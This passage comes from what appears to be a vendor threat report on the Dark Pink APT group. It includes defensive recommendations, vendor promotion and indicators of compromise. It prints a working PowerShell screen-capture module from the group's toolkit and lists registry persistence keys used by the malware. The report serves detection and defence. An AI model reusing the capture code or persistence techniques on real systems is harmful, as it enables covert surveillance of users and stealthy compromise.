System.Windows.Forms\n\n[System.Windows.Forms.Screen]::AllScreens|%{\n\n  $bounds =$_.bounds;\n\n  if($bounds.width -lt 1920){$bounds.width=1920}\n\n  if($bounds.height -lt 1080){$bounds.height=1080}\n\n  $image = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n\n  $graphics = [Drawing.Graphics]::FromImage($image)\n\n  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)\n\n  $screen_file = \"$env:tmp\\\\$($_.DeviceName.replace('\\\\\\\\.\\\\',''))_$((getdate).tostring('yyyyMMddHHmmss')).png\"\n\n  $image.Save($screen_file)\n\n  $graphics.Dispose()\n\n  $image.Dispose()\n\n  $screen_file\n\n}\n\n\n## Conclusion\n\n```\nAPT groups come and go, but the preliminary findings of Group-IB’s research into\n**Dark Pink APT demonstrates how threat actors can change course, leverage**\n**new TTPs, and achieve devastating results. The threat actors behind Dark Pink were**\nable, with the assistance of their custom toolkit, to breach the defenses of governmental and\nmilitary bodies in a range of countries in the APAC and European regions. Dark Pink’s\n**campaign once again underlines the massive dangers that spear-phishing campaigns**\npose for organizations, as even highly advanced threat actors use this vector to gain access to\nnetworks, and we recommend that organizations continue to educate their personnel on how\nto detect these sorts of emails.\n\nAt this stage, Group-IB researchers can confidently say that Dark Pink was behind the\n**successful breaches of at least seven organizations, although we believe that this**\nnumber could be higher. In line with Group-IB’s zero-tolerance policy to cybercrime, our\nanalysts will continue their diligent efforts to uncover Dark Pink’s origin and work to uncover\n\n\n-----\n\nmore of the unique or peculiar TTPs utilized by this group. We will continue to issue\nproactive notifications to any organization we find to have been breached by this particular\nthreat group.\n\n[In this blog, we attempted to reveal how Group-IB’s proprietary Threat Intelligence](https://www.group-ib.com/products/threat-intelligence/)\nsystem, which detects attacks automatically, can identify the mechanics behind ongoing\nthreat campaigns. Our clients are the first to be informed about Dark Pink, along\n**with other new APT groups that may appear on the horizon, and they are also the**\nfirst to obtain the names of compromised organizations, which helps them avoid supplychain attacks and make their network infrastructure more secure.\n\n## Recommendations\n\nUse modern email protection measures to prevent initial compromise via spear[phishing emails. We recommend Group-IB’s Business Email Protection, which is](https://www.group-ib.com/products/business-email-protection/)\nable to counter these threats effectively.\nOrganizations should ensure they foster a cybersecurity culture in their workplace,\nwhich includes sufficient training to staff on how to identify phishing emails.\nEnsure that your security measures allow for proactive threat hunting that can help\nidentify threats that cannot be detected automatically.\nLimit access to file-sharing resources, with the exception of those used within the\norganization.\nMonitor the creation of LNK files in unusual locations, such as network drives and USB\ndevices.\nEnsure that you observe any use of commands and built-in tools that are frequently\nused for collecting information about the system and files.\nMaintaining a secure organization requires ongoing vigilance, and using a proprietary\nsolution such as Group-IB **[Threat Intelligence can help organizations shore up their](https://www.group-ib.com/products/threat-intelligence/)**\nsecurity posture by equipping security teams with the latest insights into new and\nemerging threats.\n\n## Try Group-IB Threat Intelligence now!\n\nOptimize strategic, operational and tactical decision-making with best-in-class cyber threat\nanalytics.\n\n[Request Threat Intelligence Demo right now!](https://www.group-ib.com/products/threat-intelligence/)\n\n### Indicators of compromise\n\n**File indicators:**\n\n\n-----\n\nCucky:\nMD5: 926027F0308481610C85F4E3E433573B\nSHA1:\n24F65E0EE158FC63D98352F9828D014AB239AE16\nSHA256:\n9976625B5A3035DC68E878AD5AC3682CCB74EF2007C501C8023291548E11301A\nCtealer\nLoader:\nMD5: 728AFA40B20DF6D2540648EF845EB754\nSHA1:\nD8DF672ECD9018F3F2D23E5C966535C30A54B71D\nSHA256:\nC60F778641942B7B0C00F3214211B137B683E8296ABB1905D2557BFB245BF775\nPacked\nctealer:\nMD5: 7EAF1B65004421AC07C6BB1A997487B2\nSHA1:\n18CA159183C98F52DF45D3E9DB0087E17596A866\nSHA256:\nE3181EE97D3FFD31C22C2C303C6E75D0196912083D0C21536E5833EE7D108736\nMD5:\n732091AD428419247BCE87603EA79F00\nSHA1:\n142F909C26BD57969EF93D7942587CDF15910E34\nSHA256:\nE45DF7418CA47A9A4C4803697F4B28C618469C6E5A5678213AB81DF9FCC9FD51\n\n**File path:**\n\n$env:tmp\\backuplog\n$env:tmp\\backuplog1\n$env:appdata\\archive.zip\n$env:appdata\\telegram.txt\n$env:tmp\\afkslfsa.csv\n$env:tmp\\AB.zip\n$Env:tmp\\AB\n\n**Scheduled task name:**\n\nMicrosoft Idle\n\n**Mutex:**\n\ngwgXSznM-Jz92k33A-uRcCCksA-9XAU93r5\n\n**Registry path:**\n\nHKCU:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\nHKCU\\Environment\\OSBuild\nHKCU\\Environment\\STMP\nHKCU\\Environment\\SYSPS\nHKCR:\\zolfile\\shell\\open\\command\nHKCR:\\zolofile\\shell\\open\\command\\zolo\nHKCU:\\Environment\\guid\nHKCU:\\Environment\\Update\nHKCU:\\Environment\\UserInitMprLogonScript\nHKCU:\\SOFTWARE\\\\Classes\\\\abcdfile\\shell\\abcd\\\nHKCU:\\SOFTWARE\\Classes\\.4ID\\\nHKCU:\\SOFTWARE\\Classes\\.abcd\nHKCU:\\SOFTWARE\\Classes\\.psr\nHKCU:\\SOFTWARE\\Classes\\.zol\nHKCU:\\SOFTWARE\\Classes\\.zolo\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\\\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\aaaa\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\n\n\n-----\n\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\abcd\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\zolo\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo -Value\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\\zolo\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Forfiles\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Psr\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Recents\n\n### APPENDIX A.
